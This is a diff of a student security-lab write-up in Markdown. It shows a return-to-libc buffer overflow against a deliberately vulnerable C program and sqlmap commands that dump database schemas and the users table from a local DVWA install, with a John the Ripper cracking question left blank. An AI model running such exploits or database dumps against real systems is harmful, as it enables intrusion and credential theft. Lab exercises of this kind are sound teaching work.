@@ -96,9 +96,7 @@ for i in $(objdump -d shellcode |grep "^ " |cut -f2); do echo -n '\x'$i; done;ec
 ```
 *The printed result shows a 97 bytes long:*
 
-![image](https://github.com/user-attachments/assets/993994e9-3fc9-4a0b-9c94-f813142612a7)
-
-
+![image](https://github.com/user-attachments/assets/200af312-f8e9-436d-95af-dd62ac86c2a6)
 
 
 
@@ -113,11 +111,66 @@ gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-bo
 ## 4. Stack Frame Visualization: 
 ![image](https://github.com/user-attachments/assets/9a7f47b2-94da-4e3f-8255-f84f2c618f6f)
 
-*The program has a vulnerability in the `strcpy` call, where an attacker can overflow the buffer variable in `main`. This allows us to overwrite the saved return address on the stack.* 
+**Conclusion:** *The program has a vulnerability in the `strcpy` call, where an attacker can overflow the buffer variable in `main`. This allows us to overwrite the saved return address on the stack.* 
 
-## 5. Conduct an attack: 
+## 5. Prerequisite for the attack: 
 *In this case, I will use a Return-to-lib-c attack* <br> 
-*First, we need to know the address of `system()`, `exit()`, `/bin/sh` 
+*First, we need to know the address of ebp:* 
+
+```sh
+disas main
+```
+![image](https://github.com/user-attachments/assets/dc32b882-b763-448c-8f0e-d8a593cb7064)
+
+
+
+
+## 6. Conduct an attack: 
+*Construct a payload*: 
+
+![image](https://github.com/user-attachments/assets/403a0863-cb42-41a9-9e86-41d9bdde6f65)
+
+```sh
+python exploit.py | ./vuln
+```
+
+
+# Task 2: Attack on database of DVWA
+- Install dvwa (on host machine or docker container)
+- Make sure you can login with default user
+- Install sqlmap
+- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 
+
+**Question 1**: Use sqlmap to get information about all available databases
+**Answer 1**:
+## 1. Identify the vulnerable URL: 
+*Let proceed to the cookies when entering ID = 2* 
+
+```sh
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" -- cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7"    
+```
+![image](https://github.com/user-attachments/assets/42916b8d-1481-4c4a-a85b-92322cb1efc4)
+
+*Revealing the database schemas*:
+
+```sh
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" -- cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7" --schema --batch
+```
+
+
+**Question 2**: Use sqlmap to get tables, users information
+**Answer 2**:
+*To observe the users information within DVWA, we can use:* <br> 
+```sh
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" -- cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7" --columns -T users --batch  
+```
+
+**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
+**Answer 3**:
+
+
+
+
 
 
 
